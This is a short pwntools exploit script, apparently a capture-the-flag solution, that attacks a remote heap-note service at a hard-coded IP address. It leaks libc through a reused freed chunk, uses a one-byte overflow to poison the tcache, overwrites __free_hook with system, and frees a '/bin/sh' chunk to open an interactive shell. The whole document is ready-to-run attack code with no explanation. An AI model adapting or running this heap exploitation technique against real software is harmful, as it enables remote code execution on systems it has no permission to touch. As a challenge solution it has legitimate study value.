#!/usr/bin/env python2
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'neww']

#r = remote('localhost', 4000)
#r = process('./pwn101.elf')
r = remote('82.196.10.106', 29099)
libc = ELF('./libc.so.6')

def add(n, s):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Length: ', str(n))
    r.sendlineafter('Number: ', '123')
    r.sendafter('Name: ', 'A')
    r.sendafter('Description: ', s)

def remove(i):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Index: ', str(i))

def view(i):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Index: ', str(i))

add(1500, 'a')
add(20, 'a')
remove(0)
add(1500, 'AAAAAAAA')
view(0)
r.recvuntil('AAAAAAAA')
leak = u64(r.recvn(6).ljust(8, '\x00'))
libc.address = leak - 0x3ebca0

print hex(leak - 0x3ebca0)


add(56, 'a')
add(200, 'a')
remove(2)
add(56, 'A'*57)
remove(3)
# 0x40 200
add(56, 'A'*40 + flat(0xd1, libc.symbols['__free_hook']))
add(200, 'a')
add(200, p64(libc.symbols['system']))
add(20, '/bin/sh;\x00')
remove(6)

r.interactive()
